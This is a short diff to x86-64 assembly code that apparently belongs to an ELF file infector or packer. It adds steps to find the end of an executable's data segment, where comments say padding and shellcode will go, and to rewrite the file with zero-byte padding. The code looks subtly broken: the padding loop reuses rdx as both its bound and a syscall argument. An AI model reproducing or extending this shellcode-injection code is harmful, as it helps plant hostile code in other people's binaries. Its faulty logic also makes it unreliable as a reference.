@@ -728,8 +728,11 @@ retn
 
 ;void parse64elfsec(void *file, int wfd, unsigned long pad)
 parse64elfsec:
-
+	sub rsp, 8; offset of "new sect", where we will put pad and shellcode
 	sub rsp, 8;start offset 
+	; find offset where we will put our shellcode
+	call find_end_data_seg ; rax now contains the offset to the beg of pad & shellcode
+	mov [rsp + 8], rax
 	; first we swap file and wfd for syscalls
 	mov rbx, rsi
 	mov rsi, rdi
@@ -741,6 +744,28 @@ parse64elfsec:
 	mul rbx; rbx * rax -> rax
 	add rax, QWORD[rsi + 32]; e_phoff
 	mov [rsp], rax; [rsp] ==  e_phoff + (sizeof(Elf64_Phdr) * e_phnum)
-	
+	lea rsi, [rsi + rax]; file after phdrs
+	mov rdx, [rsp + 8]
+	sub rdx, [rsp]; rdx == (new_sect - start)
+	mov rax, 1
+	syscall;write(wfd, file + start, new_sect - start); basically print all from phdrs till end of data seg
+	xor rcx, rcx
+	loop_print_pad:
+	cmp rcx, rdx
+	jae loop_print_pad_end
+	push rsi
+	push rcx
+	push 0x00000000
+	lea rsi, [rsp]
+	mov rdx, 1
+	mov rax, 1
+	syscall; write(wfd, "\0", 1);
+	pop rsi; pop the "\0"
+	pop rcx
+	pop rsi
+	inc rcx
+	jmp loop_print_pad
+	loop_print_pad_end:
+	add rsp, 8
 	add rsp, 8
 retn
